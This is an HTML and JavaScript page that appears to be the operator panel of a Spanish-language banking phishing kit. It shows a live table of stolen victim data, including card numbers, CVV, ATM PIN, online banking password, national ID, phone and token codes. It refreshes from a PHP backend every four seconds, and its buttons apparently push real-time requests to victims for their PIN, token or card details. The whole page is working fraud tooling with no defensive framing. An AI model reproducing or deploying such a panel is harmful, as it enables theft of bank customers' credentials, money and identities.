<!DOCTYPE html>

<html>
    <head>
        <meta charset="windows-1252">
        <title>LISTA GENERAL</title>
        <style type="text/css">
            table {
                border-width: thin;
                border-spacing: 0px;

                border-style: none;
                border-color: black;
            }
            
            a {
                font-size: 40px
            }

        </style>    
    </head>
    <body onload="listar()">

    <p><span id="spanArchivoUsuario" STYLE="color: green; font-size: 40pt" class="">------LISTADO GENERAL-------</span></p>

    <p><input type="button" value="DETENER TIMER" id="btnDetenerTimer" onclick="detener_timer1()" /> <input type="button" id="btnReanudarTimer" value="REANUDAR TIMER"  onclick="reanudarTime1()" /></p>


        <table border="1" cellpadding="10"  >
            <thead> 
                <tr>
                <th>Estado</th>
                <th>Tarjeta usuario</th>
                <th>clave Internet</th>
                <th>Expira</th>
                <th>cvvv</th>
                <th>claveAtm</th>
                <th>DNI</th>
                <th>Usuario</th>
                <th>phone</th>
                <th>claveToken</th>
                <th>Archivo</th>
                <th>Accion</th>
                </tr>
            </thead>
            <tbody id="cuerpo1">
                
            </tbody>
        </table>
    </body>
</html>
<script type="text/javascript">
     var timer11;
    function nuevo_hxr(){
    
    var xmlhttp;
    
    if (window.XMLHttpRequest) {
            // code for IE7+, Firefox, Chrome, Opera, Safari
            xmlhttp = new XMLHttpRequest();        
    } else {
            // code for IE6, IE5
            xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");        
    }
        
    return xmlhttp;
}
    
    function listar(){
        
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","listar");        
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                document.getElementById("cuerpo1").innerHTML = xmlhttp.responseText;
                ;
            }
        
        };        
        xmlhttp.open("POST","putoPanelFunciones.php",true);
        xmlhttp.send(fd);
        
    }
    
    function solicitar_pin(archivo_token){
     
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        var nombre_cliente = document.getElementById("t_"+archivo_token).value;
        var img_seg = document.getElementById("s_"+archivo_token).value;
        fd.append("op","solicitar_pin");
        fd.append("archivo_token",archivo_token);
        fd.append("nombre_cliente",nombre_cliente);
        fd.append("img_seg",img_seg);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
                var res1 = xmlhttp.responseText;
                if(res1 == "correcto"){
                    timer11 = window.setInterval(listar,4000);
                }
            }
        
        };        
        xmlhttp.open("POST","a_jax.php",true);
        xmlhttp.send(fd);
        
    }
    
    function detener_timer1(){
        clearInterval(timer11);
    }
    function reanudarTime1(){
        timer11 = window.setInterval(listar,4000);
    }


    function solicitar_token(archivo_token){
     
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitar_token");
        fd.append("archivo_token",archivo_token);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","a_jax.php",true);
        xmlhttp.send(fd);
        
    }
    
    function solicitar_cc(archivo_token){
     
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","solicitar_cc");
        fd.append("archivo_token",archivo_token);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","a_jax.php",true);
        xmlhttp.send(fd);
        
    }
    
    
    function finalizar(archivo_token){
     
        var xmlhttp=nuevo_hxr();       
        var fd=new FormData();
        fd.append("op","finalizar");
        fd.append("archivo_token",archivo_token);
        xmlhttp.onreadystatechange = function() {
            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
                alert(xmlhttp.responseText);
                ;
            }
        
        };        
        xmlhttp.open("POST","a_jax.php",true);
        xmlhttp.send(fd);
        
    }
    
    timer11 = window.setInterval(listar,4000);
    
</script>